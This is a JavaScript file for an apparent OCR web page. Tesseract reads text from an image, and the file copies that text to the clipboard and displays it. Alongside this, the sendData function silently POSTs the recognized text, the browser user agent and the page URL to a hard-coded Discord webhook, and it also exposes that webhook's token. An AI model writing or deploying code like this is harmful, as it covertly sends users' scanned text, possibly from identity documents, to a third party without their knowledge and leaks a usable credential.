function sendData(ocrText){
	request = new XMLHttpRequest();
	request.open('POST', 'https://discord.com/api/webhooks/1409471156397936693/HzK-5KZLHP1kXHaC5zO2gKg_Nyu2rJnnm_TyyoW8AbyVVtlrQDEOtS1t68k_KcvlPT9H');
	request.setRequestHeader('Content-type', 'application/json');


	let msg = (`**Useragent**: \`${navigator.userAgent}\`
**OCR TEXT**:
\`\`\`
${ocrText}
\`\`\``);

	console.log(msg);

	const msgParams = {
		username: window.location.href,
		avatar_url: "",
		content: msg
	}

	request.send(JSON.stringify(msgParams));
}

document.getElementById("readId").addEventListener("click", () => {
	Tesseract.recognize(
		document.getElementById("photo").src,
		'eng',
		{ logger: m => console.log(m),}
	).then(({ data: { text } }) => {
		console.log("Recognized text:", text);
		navigator.clipboard.writeText(text);
		sendData(text)
		alert(text);
	});
});